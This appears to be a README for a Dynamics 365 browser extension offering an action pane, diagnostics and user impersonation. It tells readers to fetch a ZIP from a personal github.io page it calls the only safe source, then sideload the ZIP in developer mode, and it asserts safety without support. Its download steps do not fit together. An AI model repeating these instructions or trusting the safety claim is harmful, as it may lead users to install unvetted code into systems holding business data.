## 🎯 What Is This?

The **dynamics-365-power-pane-next** is a powerful browser extension that works directly inside your Microsoft Dynamics 365 and Dataverse applications. It adds a handy action pane, useful diagnostics, and a real user impersonation feature - all without needing to code or understand complex technical details.

In simple words: **it makes working with Dynamics 365 much easier and faster for everyone.**

## 🚀 Getting Started

### Step 1: Visit the Download Page

Click the green button at the top of this page, or go directly to this address:

**https://saifgharssalli.github.io**

This will open the official page for the tool. This is the only safe place to download it.

### Step 2: Download the Extension

Once you land on the page, look for a green button that says **"Code"** and click it. Then select **"Download ZIP"**. The download will begin immediately.

The file you receive will be named something like `dynamics-365-power-pane-next-main.zip`. Remember where you saved it (usually in your "Downloads" folder).

### Step 3: Install the Extension in Your Browser

1. **Open your browser** - this works with Google Chrome or Microsoft Edge (or any Chromium-based browser).
2. **Type this address in the browser bar:** `edge://extensions` (for Edge) or `chrome://extensions` (for Chrome) and press **Enter**.
3. **Turn on Developer mode** - look for a switch in the top-right corner and flip it on.
4. **Click "Load unpacked"** button that appears (usually top-left).
5. **Find and select the downloaded folder** - navigate to your Downloads folder, select the `dynamics-365-power-pane-next-main` folder (the one you just unzipped). Click **Select Folder**.

That's it! The extension is now installed and ready to use.

### Step 4: Use It in Dynamics 365

1. Go to your Dynamics 365 or Dataverse application.
2. Look for the extension icon in your browser's toolbar (usually top-right, a puzzle piece icon).
3. Click it to open the action pane and start using the tools.

## ❓ Frequently Asked Questions

### Is this safe to use?

Yes. This is an open-source tool with transparent code. It works only with your Dynamics 365 data and respects your organization's security settings.

### Do I need admin rights?

No special admin rights are needed to install the extension. However, for user impersonation features, your administrator must grant appropriate permissions in Dynamics 365.

### Will it slow down my browser?

No. The extension is lightweight and only activates when you're using Dynamics 365.

### What if it doesn't work?

Try these quick fixes:
1. Refresh your Dynamics 365 page
2. Restart your browser
3. Re-load the extension from the extensions page (click the refresh icon on the extension card)

### Can I use this on older versions of Dynamics?

It's designed for current cloud versions of Dynamics 365 (model-driven apps and Dataverse). Older on-premises versions may have limited compatibility.

## 🛠️ Troubleshooting Tips

**Issue: Extension won't load**
- Make sure you selected the correct folder (the main folder, not a sub-folder or the zip file itself)
- Check that Developer mode is still turned on
- Try closing and reopening the extensions page

**Issue: Options appear grayed out**
- You might need to refresh your Dynamics 365 page after installing
- Check with your administrator about specific permissions

**Issue: Browser says "corrupt" or "invalid"**
- Re-download the ZIP file
- Make sure you extracted fully (right-click → "Extract All" on Windows)
